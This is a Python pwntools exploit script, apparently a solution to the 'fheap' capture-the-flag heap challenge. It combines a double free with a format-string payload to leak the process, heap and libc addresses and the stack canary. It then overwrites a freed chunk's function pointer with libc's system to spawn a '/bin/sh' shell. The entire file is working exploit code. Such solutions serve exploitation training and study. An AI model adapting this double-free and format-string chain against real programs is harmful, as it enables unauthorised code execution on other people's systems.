from pwn import *
from binascii import hexlify

elf = ELF('fheap')
libc = ELF('libc-2.23.so')
r = process('./fheap')
context.arch = 'amd64'

def create(size,data):
	r.sendlineafter('3.quit\n','create ')
	r.sendlineafter('size:',str(size))
	r.sendafter('str:',data)
def delete(index):
	r.sendlineafter('3.quit\n','delete ')
	r.sendlineafter('id:',str(index))
	r.sendlineafter('?:','yes')

log.success('======== LEAK STAT ========')
create(8,p64(0x0)) #0
create(8,'11111111') #1
delete(0)
delete(1)
delete(0)
create(8,p64(0x0))
fmt_Payload = '%lx%lx%38$p%42$p'+' '*8
create(0x20,fmt_Payload+'\xf2\x00')
delete(0)
leak0 = int(r.recv(12),16)
leak1 = int(r.recv(12),16)
leak2 = int(r.recv(12+2),16)
leak3 = int(r.recv(16+2),16)
r.recv()
prbase = leak0 - 0x12a3
hpbase = leak1 - 0x10
libase = (leak2&0xfffffffff000) - 0x6f000
canary = leak3
log.info('PROC BASE -> '+str(hex(prbase)))
log.info('HEAP BASE -> '+str(hex(hpbase)))
log.info('LIBC BASE -> '+str(hex(libase)))
log.info('CANARY -> '+str(hex(canary)))
log.success('======== LEAK DONE ========')

r.send('\n')
delete(1)
create(0x8,'/bin/sh\x00')
create(0x20,'/bin/sh;'+' '*0x10+p64(libase+libc.symbols['system']))
delete(1)
r.interactive()
